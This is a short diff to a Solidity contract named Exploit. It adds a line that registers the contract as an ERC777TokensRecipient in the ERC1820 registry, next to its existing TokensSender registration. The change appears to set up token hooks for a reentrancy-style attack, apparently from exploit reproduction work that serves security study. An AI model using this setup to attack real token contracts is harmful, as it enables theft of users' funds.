@@ -72,6 +72,7 @@ contract Exploit {
 
     constructor() {
         erc1820Registery.setInterfaceImplementer(address(this), keccak256("ERC777TokensSender"), address(this));
+        erc1820Registery.setInterfaceImplementer(address(this), keccak256("ERC777TokensRecipient"), address(this));
     }
 
     /**
